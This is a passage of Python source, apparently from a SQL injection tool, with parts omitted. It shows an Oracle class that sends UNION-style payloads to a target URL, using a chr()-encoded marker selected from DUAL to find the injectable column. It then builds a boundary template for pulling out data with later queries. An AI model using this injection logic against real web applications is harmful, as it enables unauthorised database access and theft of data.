...
class Oracle(Databases):
    ...
    def set_actual_boundary(self):
        is_set = False
        boudary = self.boundary
        token = ":--:"
        table_name = "DUAL"
        col = "cast((chr(58)||chr(45)||chr(45)||chr(58))as varchar(4000))"
        ...
        for i in range(25):
            ...
            for j in range(counts):
                pack = copy.deepcopy(_)
                pack[j] = col
                col_name = [','.join(pack)]
                payload,__= self.get_payload(table_name,col_name)
                url = conf.url
                res = req.connection(url,payload)
                text = res.text
                if token in text:
                    boudary = payload.replace("chr(58)||chr(45)||chr(45)||chr(58)", "cast((chr(58)||chr(45)||chr(45)||chr(58)||%query||chr(58)||chr(45)||chr(45)||chr(58))as varchar(4000))")
